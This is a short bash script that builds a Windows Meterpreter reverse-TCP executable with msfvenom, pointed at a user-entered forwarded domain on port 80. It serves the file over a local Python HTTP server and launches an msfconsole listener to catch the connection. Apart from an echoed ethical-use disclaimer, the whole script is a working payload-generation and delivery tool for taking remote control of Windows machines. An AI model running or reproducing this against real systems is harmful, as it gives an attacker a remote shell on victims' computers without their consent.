#!/bin/bash
echo "Only use it for ethical purposes,always take written permission of the device's owner before testing!You are responsible for your actions."
echo "Make sure to port forward 80 to port 80"
echo "Please enter the Forwarded Domain"
read LocalIP
sudo msfvenom -p windows/meterpreter/reverse_tcp -f exe lhost=$LocalIP lport=80 > windowspayload.exe
echo "Payload Has Been Generated! You need to type your IP address followed by :8000 in your browser to access the HTTP Server"
python3 -m http.server &
sleep 2
xfce4-terminal --command 'sudo msfconsole -r msfconsolecommands.rc'